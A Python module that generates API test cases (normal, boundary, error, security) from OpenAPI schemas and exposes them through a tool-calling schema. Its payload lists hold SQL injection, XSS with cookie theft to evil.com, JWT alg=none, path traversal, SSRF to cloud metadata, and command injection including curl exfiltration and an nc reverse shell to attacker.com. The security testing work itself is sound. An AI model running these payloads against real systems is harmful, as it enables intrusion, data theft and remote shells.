"""
测试数据生成器，基于 API Schema 生成正常/边界/异常/安全测试数据。
"""
from __future__ import annotations

import random
import string
from dataclasses import dataclass, field
from typing import Any


@dataclass
class TestCase:
    name: str
    description: str
    method: str
    path: str
    params: dict[str, Any] | None = None
    body: Any = None
    headers: dict[str, str] | None = None
    expected_status: int | list[int] = 200
    expected_schema: dict | None = None
    priority: str = "medium"
    category: str = "normal"
    tags: list[str] = field(default_factory=list)


@dataclass
class TestSuite:
    api_name: str
    base_url: str
    cases: list[TestCase] = field(default_factory=list)

    @property
    def case_count(self) -> int:
        return len(self.cases)


class TestDataGenerator:
    """测试数据生成工具。只生成数据，不执行请求。"""

    SQL_INJECTION_PAYLOADS = [
        # 经典注入
        "' OR '1'='1",
        "' OR '1'='1' --",
        "1; DROP TABLE users;",
        "1' UNION SELECT * FROM users--",
        "admin'--",
        # 时间盲注
        "1' AND SLEEP(5)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "'; WAITFOR DELAY '00:00:05'--",
        # 报错注入
        "1' AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE()))--",
        "1' AND UPDATEXML(1, CONCAT(0x7e, VERSION()), 1)--",
        # 布尔盲注
        "1' AND '1'='1",
        "1' AND '1'='2",
        # 堆叠查询
        "1'; DROP TABLE users; SELECT * FROM products WHERE '1'='1",
        # NoSQL 注入
        '{"$gt": ""}',
        "{$ne: null}",
        # 二阶注入
        "'; INSERT INTO users VALUES('hacker','pass');--",
    ]

    XSS_PAYLOADS = [
        # 反射型
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "<svg onload=alert(1)>",
        # DOM 型
        "<img src='x' onerror='document.body.innerHTML=\"<h1>XSS</h1>\"'>",
        "<body onload=alert('XSS')>",
        # 存储型
        "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>",
        # 属性注入
        "\" onfocus=alert(1) autofocus=\"",
        "' onmouseover='alert(1)",
        # 编码绕过
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        # 无 script 标签
        "<iframe src=javascript:alert(1)>",
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    ]

    # JWT 攻击 Payload
    JWT_ATTACK_PAYLOADS = [
        # None 算法攻击
        {"header": '{"alg":"none","typ":"JWT"}', "payload": '{"sub":"admin","iat":1516239022}'},
        # 弱密钥
        {"header": '{"alg":"HS256","typ":"JWT"}', "secret": "secret"},
        {"header": '{"alg":"HS256","typ":"JWT"}', "secret": "password"},
        # 过期 Token
        {"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjoxNTE2MjM5MDIyfQ.invalid"},
        # 伪造 Token
        {"token": "Bearer invalid_token_12345"},
        # 空签名
        {"header": '{"alg":"HS256","typ":"JWT"}', "payload": '{"admin":true}', "signature": ""},
    ]

    # 路径遍历 Payload
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/var/www/html/../../etc/shadow",
        "file:///etc/passwd",
    ]

    # SSRF Payload
    SSRF_PAYLOADS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:8000/admin",
        "http://localhost:6379/",           # Redis
        "http://metadata.google.internal/",  # GCP
        "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
    ]

    # 命令注入 Payload
    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "$(whoami)",
        "`id`",
        "&& ping -c 5 127.0.0.1",
        "| curl http://evil.com/exfil?d=$(hostname)",
        "; nc -e /bin/sh attacker.com 4444",
        "%0a/bin/cat%20/etc/passwd",
    ]

    def generate_normal_cases(
        self, method: str, path: str,
        parameters: list[dict[str, Any]] | None = None,
        request_body_schema: dict[str, Any] | None = None,
        success_status: int = 200,
    ) -> list[TestCase]:
        cases = []
        cases.append(TestCase(
            name=f"[normal] {method} {path}",
            description=f"Standard {method} request with valid data",
            method=method, path=path,
            params=self._gen_valid_params(parameters) if parameters else None,
            body=self._gen_valid_body(request_body_schema) if request_body_schema else None,
            expected_status=success_status,
            category="normal", tags=["happy-path"],
        ))
        return cases

    # Methods that typically have a request body
    _BODY_METHODS = {"POST", "PUT", "PATCH"}

    def _uses_body(self, method: str) -> bool:
        return method.upper() in self._BODY_METHODS

    def generate_boundary_cases(
        self, method: str, path: str,
        parameters: list[dict[str, Any]] | None = None,
        request_body_schema: dict[str, Any] | None = None,
    ) -> list[TestCase]:
        cases = []
        uses_body = self._uses_body(method)

        # 无参数 GET/HEAD/OPTIONS: 测试意外的 query params
        if not parameters and not uses_body:
            cases.append(TestCase(
                name=f"[boundary] {method} {path} - unexpected query params",
                description="Send unexpected query parameter, expect tolerant handling",
                method=method, path=path,
                params={"unexpected": "value"},
                expected_status=[200, 400],
                category="boundary", tags=["unexpected-params"],
            ))

        if uses_body:
            cases.append(TestCase(
                name=f"[boundary] {method} {path} - empty body",
                description="Send empty/null body, expect 400/422",
                method=method, path=path, body=None,
                expected_status=[400, 422],
                category="boundary", tags=["empty-body"],
            ))

        # Oversized input: use query params for GET, body for POST/PUT/PATCH
        oversized_value = "A" * 10240
        if uses_body:
            cases.append(TestCase(
                name=f"[boundary] {method} {path} - oversized body",
                description="10KB string in body, expect 400/413/422",
                method=method, path=path,
                body={"value": oversized_value},
                expected_status=[400, 413, 422],
                category="boundary", tags=["oversized-input"],
            ))
        elif parameters:
            # GET/DELETE: send oversized data via query params
            string_params = [p for p in parameters if p.get("schema", {}).get("type") == "string"]
            if string_params:
                target = string_params[0]["name"]
                cases.append(TestCase(
                    name=f"[boundary] {method} {path} - oversized query param",
                    description="10KB query param, expect 400/413/422",
                    method=method, path=path,
                    params={target: oversized_value},
                    expected_status=[400, 413, 422],
                    category="boundary", tags=["oversized-input"],
                ))

        # Unicode: use query params for GET, body for POST/PUT/PATCH
        if uses_body:
            cases.append(TestCase(
                name=f"[boundary] {method} {path} - unicode chars",
                description="Emoji + zero-width chars in parameter",
                method=method, path=path,
                body={"name": "test ​ \U0001f680"},
                expected_status=[200, 201, 400, 422],
                category="boundary", tags=["unicode"],
            ))

        if parameters:
            num_params = [
                p for p in parameters
                if p.get("schema", {}).get("type") in ("integer", "number")
            ]
            if num_params:
                cases.append(TestCase(
                    name=f"[boundary] {method} {path} - zero value",
                    description="Parameter value is 0",
                    method=method, path=path,
                    params={p["name"]: 0 for p in num_params} if not uses_body else None,
                    body={p["name"]: 0 for p in num_params} if uses_body else None,
                    expected_status=[200, 201, 400, 422],
                    category="boundary", tags=["zero-value"],
                ))

        return cases

    def generate_error_cases(
        self, method: str, path: str,
        parameters: list[dict[str, Any]] | None = None,
    ) -> list[TestCase]:
        cases = [
            TestCase(
                name=f"[error] {method} {path} - wrong method",
                description="Use unsupported HTTP method, expect 405",
                method="OPTIONS" if method != "OPTIONS" else "PATCH",
                path=path, expected_status=[405, 404],
                category="error", tags=["wrong-method"],
            ),
        ]

        # Body-based error tests only for methods that use a body
        if self._uses_body(method):
            cases.extend([
                TestCase(
                    name=f"[error] {method} {path} - wrong content-type",
                    description="Send text/plain instead of application/json, expect 415",
                    method=method, path=path,
                    headers={"Content-Type": "text/plain"},
                    body="plain text not json",
                    expected_status=[415, 400, 422],
                    category="error", tags=["wrong-content-type"],
                ),
                TestCase(
                    name=f"[error] {method} {path} - malformed JSON",
                    description="Send unparseable JSON string",
                    method=method, path=path,
                    body="{invalid json {{",
                    expected_status=[400, 422],
                    category="error", tags=["malformed-json"],
                ),
            ])
        elif parameters:
            # GET/DELETE: body-based tests are meaningless — test via query params instead
            string_params = [p for p in parameters if p.get("schema", {}).get("type") == "string"]
            if string_params:
                target = string_params[0]["name"]
                cases.append(TestCase(
                    name=f"[error] {method} {path} - oversized query value",
                    description="30KB query param value, expect 400/413/422",
                    method=method, path=path,
                    params={target: "X" * 30720},
                    expected_status=[400, 413, 422],
                    category="error", tags=["oversized-query"],
                ))

        if parameters:
            required_params = [p for p in parameters if p.get("required")]
            if required_params:
                cases.append(TestCase(
                    name=f"[error] {method} {path} - missing required params",
                    description=f"Missing: {[p['name'] for p in required_params]}",
                    method=method, path=path,
                    expected_status=[400, 422],
                    category="error", tags=["missing-required"],
                ))

        return cases

    def generate_security_cases(
        self, method: str, path: str,
        parameters: list[dict[str, Any]] | None = None,
        request_body_schema: dict[str, Any] | None = None,
        auth_required: bool = False,
    ) -> list[TestCase]:
        cases = []

        # ── 认证绕过 ──────────────────────────────────────────
        if auth_required:
            cases.append(TestCase(
                name=f"[security] {method} {path} - no auth",
                description="Request without any authentication, expect 401",
                method=method, path=path,
                expected_status=401,
                category="security", tags=["no-auth", "owasp"],
            ))
            cases.append(TestCase(
                name=f"[security] {method} {path} - invalid token",
                description="Request with forged/expired token, expect 401",
                method=method, path=path,
                headers={"Authorization": "Bearer invalid_token_xxx"},
                expected_status=401,
                category="security", tags=["invalid-token", "owasp"],
            ))
            # JWT None 算法攻击
            cases.append(TestCase(
                name=f"[security] {method} {path} - JWT none algorithm",
                description="JWT with alg=none bypass, expect 401",
                method=method, path=path,
                headers={"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."},
                expected_status=401,
                category="security", tags=["jwt-attack", "owasp"],
            ))

        has_strings = (
            (parameters and any(
                p.get("schema", {}).get("type") == "string" for p in parameters
            ))
            or request_body_schema is not None
        )

        tgt_field = "query" if method == "GET" else "name"

        # ── SQL 注入（5 个代表性 payload） ─────────────────────
        if has_strings:
            for i, payload in enumerate(self.SQL_INJECTION_PAYLOADS[:5]):
                cases.append(TestCase(
                    name=f"[security] {method} {path} - SQL injection #{i+1}",
                    description=f"SQL injection: {payload[:40]}",
                    method=method, path=path,
                    body={tgt_field: payload} if method != "GET" else None,
                    params={"q": payload} if method == "GET" else None,
                    expected_status=[400, 422, 200],
                    category="security", tags=["sql-injection", "owasp"],
                ))

        # ── XSS（3 个代表性 payload） ─────────────────────────
        if has_strings:
            for i, payload in enumerate(self.XSS_PAYLOADS[:3]):
                cases.append(TestCase(
                    name=f"[security] {method} {path} - XSS #{i+1}",
                    description=f"XSS: {payload[:40]}",
                    method=method, path=path,
                    body={tgt_field: payload} if method != "GET" else None,
                    params={"name": payload} if method == "GET" else None,
                    expected_status=[400, 422, 200],
                    category="security", tags=["xss", "owasp"],
                ))

        # ── 命令注入 ──────────────────────────────────────────
        if has_strings:
            for i, payload in enumerate(self.COMMAND_INJECTION_PAYLOADS[:3]):
                cases.append(TestCase(
                    name=f"[security] {method} {path} - CMD injection #{i+1}",
                    description=f"Command injection: {payload[:40]}",
                    method=method, path=path,
                    body={"cmd": payload} if method != "GET" else None,
                    params={"cmd": payload} if method == "GET" else None,
                    expected_status=[400, 422, 200],
                    category="security", tags=["cmd-injection", "owasp"],
                ))

        # ── 路径遍历 ──────────────────────────────────────────
        if has_strings:
            for i, payload in enumerate(self.PATH_TRAVERSAL_PAYLOADS[:3]):
                cases.append(TestCase(
                    name=f"[security] {method} {path} - path traversal #{i+1}",
                    description=f"Path traversal: {payload[:40]}",
                    method=method, path=path,
                    params={"file": payload} if method == "GET" else None,
                    body={"file": payload} if method != "GET" else None,
                    expected_status=[400, 422, 200],
                    category="security", tags=["path-traversal", "owasp"],
                ))

        # ── SSRF ──────────────────────────────────────────────
        if has_strings:
            for i, payload in enumerate(self.SSRF_PAYLOADS[:3]):
                cases.append(TestCase(
                    name=f"[security] {method} {path} - SSRF #{i+1}",
                    description=f"SSRF probe: {payload[:50]}",
                    method=method, path=path,
                    params={"url": payload} if method == "GET" else None,
                    body={"url": payload} if method != "GET" else None,
                    expected_status=[400, 422, 200],
                    category="security", tags=["ssrf", "owasp"],
                ))

        # ── CSRF ──────────────────────────────────────────────
        # 测试是否缺少 CSRF token 保护（适用于有状态的 POST/PUT/DELETE）
        if method in ("POST", "PUT", "DELETE", "PATCH"):
            cases.append(TestCase(
                name=f"[security] {method} {path} - missing CSRF token",
                description="Request without CSRF/XSRF token header, expect 403",
                method=method, path=path,
                headers={"X-Requested-With": "XMLHttpRequest"},
                expected_status=[403, 401, 400, 200],
                category="security", tags=["csrf", "owasp"],
            ))

        return cases

    def _resolve_path_params(self, path: str, parameters: list[dict[str, Any]] | None) -> str:
        """替换路径中的 {param} 占位符为实际测试值。"""
        import re
        if not parameters:
            return path
        # 从 parameters 中找 path 类型的参数
        path_params = [p for p in parameters if p.get("in") == "path"]
        resolved = path
        for p in path_params:
            name = p.get("name", "")
            schema = p.get("schema", {})
            ptype = schema.get("type", "string")
            # 根据类型生成测试值
            if ptype == "integer":
                value = "1"
            elif ptype == "number":
                value = "1.0"
            elif ptype == "boolean":
                value = "true"
            else:
                # string 类型：用参数名生成可识别的测试值
                if "id" in name.lower():
                    value = "test-id-001"
                elif "uuid" in name.lower():
                    value = "00000000-0000-0000-0000-000000000001"
                else:
                    value = f"test_{name}"
            resolved = resolved.replace(f"{{{name}}}", value)
        return resolved

    def generate_full_suite(
        self, api_name: str, base_url: str, method: str, path: str,
        parameters: list[dict[str, Any]] | None = None,
        request_body_schema: dict[str, Any] | None = None,
        success_status: int = 200, auth_required: bool = False,
    ) -> TestSuite:
        # 先替换路径参数
        resolved_path = self._resolve_path_params(path, parameters)

        has_path_params = any(p.get("in") == "path" for p in (parameters or []))

        all_cases = []
        all_cases.extend(self.generate_normal_cases(method, resolved_path, parameters, request_body_schema, success_status))
        all_cases.extend(self.generate_boundary_cases(method, resolved_path, parameters, request_body_schema))
        all_cases.extend(self.generate_error_cases(method, resolved_path, parameters))
        all_cases.extend(self.generate_security_cases(method, resolved_path, parameters, request_body_schema, auth_required))

        # Path param edge cases: test with special IDs to detect bad error handling
        path_int_params = [p for p in (parameters or []) if p.get("in") == "path" and p.get("schema", {}).get("type") in ("integer", "number")]
        for pp in path_int_params:
            name = pp["name"]
            # Resolve all OTHER path params first, then replace the target
            other_params = [p for p in (parameters or []) if p.get("name") != name]
            base_path = self._resolve_path_params(path, other_params)
            for test_id, desc in [(999, "large-nonexistent"), (-1, "negative"), (0, "zero-id")]:
                test_path = base_path.replace(f"{{{name}}}", str(test_id))
                all_cases.append(TestCase(
                    name=f"[boundary] {method} {test_path} - {desc}",
                    description=f"Path param edge: {desc} ({test_id})",
                    method=method, path=test_path,
                    expected_status=[400, 404, 422],
                    category="boundary", tags=["path-param-edge", desc],
                ))

        for case in all_cases:
            case.path = f"{base_url.rstrip('/')}{case.path}"
            # 有路径参数时，404 总是合理的（测试 ID 可能不存在）
            if has_path_params:
                expected = case.expected_status
                if isinstance(expected, list):
                    if 404 not in expected:
                        expected.append(404)
                elif expected != 404:
                    case.expected_status = [expected, 404]

        return TestSuite(api_name=api_name, base_url=base_url, cases=all_cases)

    def _gen_valid_params(self, parameters: list[dict[str, Any]]) -> dict[str, Any]:
        params: dict[str, Any] = {}
        for param in parameters:
            name = param.get("name", "")
            schema = param.get("schema", {})
            ptype = schema.get("type", "string")
            example = schema.get("example")
            if example is not None:
                params[name] = example
            elif ptype == "integer":
                params[name] = 1
            elif ptype == "number":
                params[name] = 1.0
            elif ptype == "boolean":
                params[name] = True
            elif ptype == "array":
                params[name] = []
            else:
                params[name] = self._gen_valid_string(param)
        return params

    @staticmethod
    def _gen_valid_string(param: dict[str, Any]) -> str:
        """Generate a valid string value respecting format/pattern constraints."""
        schema = param.get("schema", {})
        fmt = schema.get("format", "")
        pattern = schema.get("pattern", "")

        # Handle OpenAPI format hints
        if fmt == "date":
            return "2026-07-01"
        if fmt == "date-time":
            return "2026-07-01T00:00:00Z"
        if fmt == "email":
            return "test@example.com"
        if fmt == "uri" or fmt == "url":
            return "https://example.com/test"
        if fmt == "uuid":
            return "00000000-0000-0000-0000-000000000001"

        # Handle pattern constraints — generate a minimal matching value
        if pattern:
            # Date-like pattern: YYYY-MM-DD
            if "\\d{4}" in pattern and "\\d{2}" in pattern:
                return "2026-07-01"
            # Alphanumeric
            if "[a-zA-Z0-9]" in pattern or "\\w" in pattern:
                return "abc123"

        # Use parameter name hints for smarter defaults
        name = param.get("name", "").lower()
        if "id" in name:
            return "test-id-001"
        elif "uuid" in name:
            return "00000000-0000-0000-0000-000000000001"
        elif "date" in name:
            return "2026-07-01"
        elif "time" in name:
            return "2026-07-01T00:00:00Z"
        elif "email" in name:
            return "test@example.com"

        return "test"

    def _gen_valid_body(self, schema: dict[str, Any]) -> dict[str, Any]:
        if not schema:
            return {}
        stype = schema.get("type", "object")
        if stype == "object":
            body: dict[str, Any] = {}
            props = schema.get("properties", {})
            for prop_name, prop_schema in props.items():
                pt = self._resolve_type(prop_schema)
                example = prop_schema.get("example")
                if example is not None:
                    body[prop_name] = example
                elif pt == "integer":
                    body[prop_name] = 1
                elif pt == "number":
                    body[prop_name] = 1.0
                elif pt == "boolean":
                    body[prop_name] = True
                elif pt == "array":
                    body[prop_name] = []
                elif pt == "object":
                    body[prop_name] = {}
                elif pt == "null":
                    body[prop_name] = None
                else:
                    body[prop_name] = "test_value"
            return body
        elif stype == "array":
            return []
        elif stype == "string":
            return {"value": schema.get("example", "test")}
        return {}

    @staticmethod
    def _resolve_type(prop_schema: dict[str, Any]) -> str:
        """解析属性类型，支持 anyOf/oneOf 等复合类型"""
        if "type" in prop_schema:
            return prop_schema["type"]
        # 处理 anyOf/oneOf: 取第一个非 null 类型
        for key in ("anyOf", "oneOf"):
            options = prop_schema.get(key, [])
            if options:
                for opt in options:
                    t = opt.get("type")
                    if t and t != "null":
                        return t
                return "null"
        return "string"


TEST_DATA_GEN_SCHEMA = {
    "type": "function",
    "function": {
        "name": "generate_test_cases",
        "description": "Generate test case suite (normal/boundary/error/security) from API schema.",
        "parameters": {
            "type": "object",
            "properties": {
                "api_name": {"type": "string", "description": "API name"},
                "base_url": {"type": "string", "description": "Base URL"},
                "method": {"type": "string", "enum": ["GET", "POST", "PUT", "PATCH", "DELETE"]},
                "path": {"type": "string", "description": "API path"},
                "parameters": {"type": "array", "description": "OpenAPI parameter definitions"},
                "request_body_schema": {"type": "object", "description": "Request body JSON Schema"},
                "success_status": {"type": "integer", "description": "Expected success status code"},
                "auth_required": {"type": "boolean", "description": "Whether auth is required"},
            },
            "required": ["api_name", "base_url", "method", "path"],
        },
    },
}
